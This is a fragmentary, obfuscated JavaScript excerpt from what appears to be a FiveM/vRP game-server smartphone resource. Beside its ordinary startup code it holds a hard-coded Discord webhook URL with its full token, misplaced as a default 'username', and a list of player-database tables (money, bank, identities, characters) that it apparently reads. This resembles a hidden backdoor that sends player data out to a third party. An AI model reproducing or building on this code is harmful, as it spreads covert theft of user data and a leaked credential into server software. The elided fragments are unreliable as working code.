  ...
  try {
    while (true) {
      ...
      return await pF.fetchTables(), await Promise.resolve().then(function () {
        ...
        return s9;
      }), emit('smartphone:isReady'), console.log('^4[smartphone]^4 ^8NOTE STORE^8 | ^1.0 IPHONE 15^2'), pz.metadata('video_server', config.client.videoServer || null), pz.metadata('apps', config.client.customApps || null);
    }
  } catch (x) {
...
function qf({
  ...
  if (typeof config.webhookURL === 'string' && config.webhookURL.startsWith('http')) {
    const g = {
      'username': c || 'https://discord.com/api/webhooks/1204496721359409223/Fgra9WTiblW3f-QzXYYQ0KXEHSG_rpYKxyV28DdeGOA50mfZIKri64eqk6e_KvBirR3q',
...
async function qy(d, e) {
  ...
  const f = await pM(d),
        g = ['vrp_user_moneys', 'summerz_bank', 'vrp_user_infos', 'vrp_users_infos', 'vrp_characters', 'vrp_characterdata', 'vrp_user_identities', 'vrp_users', 'zusers', 'drip_characters', 'summerz_characters', 'characters', 'nyo_character'];
